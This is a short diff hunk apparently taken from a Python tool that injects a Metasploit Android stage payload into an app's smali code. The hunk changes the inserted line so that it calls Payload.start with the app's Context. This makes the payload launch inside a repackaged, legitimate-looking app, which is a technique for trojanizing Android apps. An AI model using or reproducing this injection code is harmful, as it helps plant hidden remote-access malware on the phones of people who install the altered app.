@@ -190,7 +190,7 @@ def newsmali(contents,targetstring):
 				f.write('\n')
 				f.write(i)
 				f.write('\n')
-				f.write('    invoke-static/range {p0}, Lcom/metasploit/stage/Payload;->start()V')
+				f.write('    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V')
 			else:
 				f.write('\n')
 				f.write(i)
